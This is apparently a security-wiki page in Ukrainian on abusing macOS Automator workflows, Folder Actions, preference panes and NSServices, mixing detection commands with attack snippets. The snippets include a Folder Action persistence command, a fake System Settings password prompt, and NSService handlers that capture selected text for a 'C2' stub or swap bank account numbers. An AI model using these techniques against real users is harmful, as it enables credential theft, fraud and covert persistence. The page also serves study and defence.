# Зловживання macOS Automator, Preference Panes і NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions і Workflows

### Основна інформація

**Automator** — це візуальний інструмент автоматизації macOS. Він виконує **workflows** (пакети `.workflow`), що складаються з **actions** (пакетів `.action`). Automator також забезпечує роботу **Folder Actions**, **Quick Actions** та інтеграцію з **Shortcuts**. У сучасних версіях macOS workflows також можна **імпортувати до Shortcuts**, тому та сама malicious logic може відображатися як Finder Quick Action, user service у `~/Library/Services/` або shortcut, що використовує legacy Automator actions.

Automator actions — це **plugins**, які завантажуються середовищем виконання Automator під час виконання workflow. Вони можуть:
- Виконувати довільні shell scripts
- Обробляти файли та дані
- Взаємодіяти із застосунками через AppleScript
- Об’єднуватися в ланцюжки для складної автоматизації

### Чому це важливо

> [!WARNING]
> Automator workflows можна **соціально скерувати до виконання** — вони виглядають як звичайні файли документів. Пакет `.workflow` може містити вбудовані shell commands, які виконуються під час запуску workflow. У поєднанні з Folder Actions вони забезпечують **автоматичну persistence**, що спрацьовує під час подій із файлами. Нещодавні виправлення Gatekeeper також показали, що **Quick Actions, вбудовані в app** (`Contents/PlugIns/*.workflow`), слід розглядати як виконуваний вміст, а не як нешкідливі дані.

### Виявлення
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Social-Engineered Workflow

Для більшості користувачів пакет `.workflow` виглядає як звичайний файл документа:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Атака: Folder Action Persistence

Folder Actions автоматично виконують workflow, коли файли додаються до папки, що відстежується:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions зберігаються після перезавантажень і виконуються безшумно. Folder Action для `~/Downloads` означає, що **кожен завантажений файл запускає ваш payload** — зокрема файли із Safari, Chrome, AirDrop і вкладення електронної пошти. Також зверніть увагу, що `System Events` може реєструвати Folder Actions, які вказують на скрипти поза стандартними розташуваннями `~/Library/Scripts/Folder Action Scripts`, тому пошук у довільних шляхах може бути корисним. Відомості про пов’язані наслідки для TCC див. на [сторінці TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Основна інформація

Preference panes (bundles `.prefPane`) — це плагіни, які завантажуються з **System Settings** (раніше — System Preferences). Вони надають панелі інтерфейсу для налаштування системних або сторонніх функцій. У старіших системах вони завантажувалися безпосередньо через `System Preferences`; у новіших релізах сторонні panes зазвичай обробляються **legacy loader XPC service**, запущеним із System Settings.

### Чому це важливо

- Preference panes виконуються у **довіреному host process**, створеному System Settings / System Preferences
- У сучасних системах цим host може бути **`legacyLoader` XPC service**, тому важливою межею все ще залишається **довірений Apple UI process -> завантаження стороннього коду**
- Сторонні preference panes успадковують **контекст безпеки host process** і довіру користувача, пов’язану з цим UI
- Користувачі встановлюють preference panes, **двічі клацаючи** їх — це зручно для social engineering
- Після встановлення вони **зберігаються** й завантажуються щоразу, коли System Settings відкриває цю панель

### Виявлення
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Шкідлива preference pane успадковує **контекст безпеки pane host** (історично `System Preferences`, а в новіших версіях часто допоміжний процес `legacyLoader`, запущений через `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Атака: Persistence через встановлення
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Панель налаштувань може імітувати легітимні системні панелі UI, щоб **виманювати облікові дані**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Основна інформація

**NSServices** дають змогу застосункам надавати функціональність іншим застосункам через **меню Services** (правий клік → Services). Коли користувач вибирає текст або дані та викликає сервіс, вибрані дані **надсилаються постачальнику сервісу** для обробки.

Сервіси оголошуються в `Info.plist` застосунку в ключі `NSServices` і реєструються на сервері pasteboard (`pbs`). macOS також підтримує **кеш сервісів** і **політику обмежень**, які визначають, які сервіси видимі та чи повинні sandboxed callers отримувати додаткове попередження.

### Чому це важливо

- Сервіси отримують **міжзастосунковий потік даних** — вибраний текст із будь-якого застосунку надсилається сервісу
- Шкідливий сервіс може захоплювати дані з password managers, email-клієнтів і фінансових застосунків
- Сервіси можуть **повертати змінені дані** застосунку, що викликав їх (man-in-the-middle під час операцій із вибраними даними)
- Назви сервісів можна створити так, щоб вони здавалися легітимними ("Format Text", "Encrypt Selection", "Share")
- Необов'язковий прапорець `NSRestricted` має значення для безпеки: сервіс, позначений як unrestricted, може бути викликаний sandboxed app без попередження, яке macOS показує для сервісів, здатних спричинити escape<sup>[[2]](#references)</sup>

### Виявлення
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Атака: Сервіс перехоплення даних
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Атака: Data Modification (Man-in-the-Middle)

Сервіс може **модифікувати повернуті дані**, водночас створюючи враження, що він надає легітимну функцію:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple підтримує необов'язкове булеве значення `NSRestricted` для кожного визначення service. Якщо його встановлено, macOS попереджає sandboxed callers, оскільки service може допомогти їм **вийти за межі sandbox або privacy boundaries**. З offensive perspective це дає два корисні напрями для аудиту:

- Шукати **third-party services, не позначені як restricted**, хоча вони проксують Apple Events, file access або інші привілейовані дії
- Шукати **high-value built-in services** із сильними entitlements (наприклад, services, які надаються Script Editor або helpers на основі Finder), і перевіряти, чи достатньо user interaction, щоб перетворити їх на primitive для доступу до даних

Хорошим нещодавнім прикладом є **CVE-2022-48574**, де механізм Services можна було використати для доступу до **TCC-protected user files без очікуваного confirmation flow**. Вразливість виправлено, але техніка залишається корисною для threat modeling: будь-який service, який пересилає file access або automation requests від імені caller, заслуговує на таку саму увагу.<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple виправила Gatekeeper bypass у 2024 році, коли Automator Quick Action, вбудований у app bundle, міг запускатися без стандартної assessment. Під час аудиту apps перевіряйте `Contents/PlugIns/*.workflow/Contents/document.wflow` так само, як helper scripts або login items. Див. [сторінку Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts can inherit legacy Automator behavior**: Apple також додала додатковий user-consent prompt після того, як було виявлено, що third-party shortcuts використовують **legacy Automator action** для надсилання Apple Events без очікуваного permission flow. Імпортовані workflows і shortcut bundles слід перевіряти на наявність `Run AppleScript`, `Run Shell Script` та подібних bridge actions. Див. [сторінку TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: У 2025 році Apple випустила ще одне виправлення Automator, пов'язане з доступом до захищених user data. Навіть якщо Automator є legacy surface, розглядайте будь-який workflow runner, Quick Action host або automation bridge як актуальну attack surface, а не як dead code.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Панель налаштувань → Ескалація TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Крадіжка з Password Manager
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Посилання

- [1] [Apple — Про вміст безпеки macOS Ventura 13.7, Sonoma 14.7 та Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Як працював експлойт NSServices у macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
